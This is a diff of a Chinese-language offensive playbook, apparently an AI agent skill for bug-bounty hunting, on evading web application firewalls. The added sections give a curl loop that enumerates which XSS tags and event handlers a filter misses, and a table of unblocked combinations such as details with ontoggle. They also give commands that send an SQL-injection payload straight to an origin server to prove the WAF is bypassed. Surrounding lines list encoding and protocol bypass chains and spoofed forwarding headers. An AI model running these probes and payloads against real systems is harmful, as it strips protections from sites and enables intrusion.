@@ -36,9 +36,30 @@ Payload 被拦
 
 1. **确认谁拦的**：看响应头/错误页/状态码；同参数发普通字符串对照，只恶意 payload 触发即 WAF [本地 src-hunter]。
 2. **识别 WAF**：`wafw00f https://target`；看指纹（cf-ray / ModSecurity / AWS / 阿里云盾 / 长亭）[本地 src-hunter]。
-3. **选第一道绕过（最便宜优先）**：编码层（URL 双编码 → Unicode → 实体）→ 语义层（等价函数/注释/大小写）→ 协议层（HPP/Chunked/改 method/改 Content-Type）[本地 src-hunter]。
-4. **第一道失败**：拆 payload（多参数组合/超长前缀填充/Cookie 走私）→ 切入口（Header → Cookie → JSON body → multipart）[本地 src-hunter]。
-5. **还失败**：二次注入（先存 DB 再触发）→ 切目标（多租户换域名/子域）→ 记录「防护有效」转下一个端点 [本地 src-hunter]。
+3. **枚举黑名单边界（黑名单是枚举制，一定有漏 —— 不要猜，逐个探测）** `[本 skill 自研，2026-10 实战沉淀]`：
+
+   ```bash
+   # 前提：有一个会【回显】该 token 的参数（如搜索框）；逐个发候选 token，看哪些被拦（403）/被改写（回显变了）/放行
+   for t in script iframe svg img details body marquee math template \
+            onload onerror onfocus ontoggle onbegin onclick onpointerenter; do
+     curl -s -o /tmp/r -w "%{http_code} $t  " "https://target/?q=$t"; grep -o "$t" /tmp/r | head -1; echo
+   done
+   ```
+
+   本次实测某自研过滤器（**回显型参数，直接看哪些词被改写**）：
+
+   | 在名单内（被拦/被改写） | **不在名单内（放行 = 绕过支点）** |
+   |---|---|
+   | 标签：`script` `iframe` `base` `meta` `object` `applet` `link` | 标签：**`details`** `svg` `img` `marquee` `math` `template` |
+   | 事件：`onload` `onerror` `onfocus` `onclick` `onmouseover` `onscroll` `onanimationstart` | 事件：**`ontoggle`** **`onbegin`** `onpointerenter` `onwheel` |
+
+   → 绕过支点 = **名单外的组合**（本次用 `details` + `ontoggle`、`svg`+`animate`+`onbegin`）。
+   > 成本极低（20~30 个候选词）、收益极高：把"猜绕过"变成"查表"。**黑名单越长越容易漏**。
+   > 若过滤器还会**改写**（如把 `script` 变成 `sc<x>ript`），说明它做的是"打断"而非"删除" —— 结合**双重实体编码**可进一步绕（`../playbooks/encoding-charset-boundary.md` §4.4）。
+
+4. **选第一道绕过（最便宜优先）**：编码层（URL 双编码 → Unicode → 实体）→ 语义层（等价函数/注释/大小写）→ 协议层（HPP/Chunked/改 method/改 Content-Type）[本地 src-hunter]。
+5. **第一道失败**：拆 payload（多参数组合/超长前缀填充/Cookie 走私）→ 切入口（Header → Cookie → JSON body → multipart）[本地 src-hunter]。
+6. **还失败**：二次注入（先存 DB 再触发）→ 切目标（多租户换域名/子域）→ 记录「防护有效」转下一个端点 [本地 src-hunter]。
 
 ## 4. Payload 区（每条标注出处）
 
@@ -160,6 +181,37 @@ curl --insecure -v -H "Host: target.host" https://<ip>/index.html
 ```
 
 伪造来源 Header（绕过 IP 限制）[Claude-Red]：`X-Forwarded-For: 127.0.0.1` / `X-Client-IP` / `X-Real-IP` / `Client-IP` / `Forwarded: for=127.0.0.1`（前提：后端信任这些头）。
+
+**源站直连的「对照实验」判据** `[本 skill 自研，2026-10 实战沉淀]`：
+
+拿到源站 IP 后，**不要只发一次就下结论** —— 用「同一 URL、两条路径」成对取证：
+
+```bash
+U="/index.php?x=%27%20OR%201=1"      # 挑一个 WAF 一定会拦的 payload
+
+# A. 经 WAF（正常域名解析）
+curl -s -o /dev/null -w "WAF: %{http_code}/%{size_download}\n" "https://target.com$U"
+# B. 源站直连（--resolve 保留正确 SNI + Host，比 -H Host 更稳）
+curl -s -o /dev/null -w "源站: %{http_code}/%{size_download}\n" \
+     --resolve target.com:443:<origin-ip> "https://target.com$U"
+```
+
+**判据（成对才成立）**：
+
+| 现象 | 说明 |
+|---|---|
+| 经 WAF `403` + **WAF 拦截页**（天翼云 8919B / 各家特征不同），源站 `200` + **正常业务页** | ✅ **WAF 被完全绕过** —— 最有力的证据 |
+| 经 WAF `403`，源站 `404` | ✅ 也成立，但视觉弱（两个都是错误页） |
+| 两侧都 `200`/都 `403` | ❌ 不成立 |
+
+**辅助判据（WAF 特征头）**：天翼云 `x-ct-request-id`、Cloudflare `cf-ray`/`__cf_bm`、阿里云盾、长毛雷池等 —— **源站响应缺该头**即证明未经过 WAF。
+
+**取证建议**：截「同一 URL 两种走法」的**并排对比图**（左 WAF 拦截页 / 右正常页），比只贴一段响应体有力得多。
+
+**工具坑**：
+- **`ffuf` 不支持 `--resolve`** —— 直接对域名跑 ffuf 会**经 WAF**（拿到的 403 全是 WAF 拦截，会误判成"文件被限速"）。要打源站必须用 `-u https://<origin-ip>/FUZZ -H "Host: target.com"`。
+- **WAF 拦截页 vs 应用 404 的区分**：按**响应体大小**过滤（如天翼云拦截页固定 8919B、nginx 404 是 548B），别只看状态码。
+- **用「响应大小 / 响应时间」当判据前，先连发 3 次确认该 URL 的响应是确定的**（排除动态内容/轮播/统计脚本造成的尺寸抖动）。本次实测：同一 URL 连发 3 次尺寸完全一致才敢用大小做判据；若尺寸抖动，改用**特征串匹配**（如拦截页里的 `您的请求可能存在威胁`）而非尺寸。
 
 ### 4.6 路径遍历 / SSRF / 文件上传绕过 `[本地 src-hunter]`
 
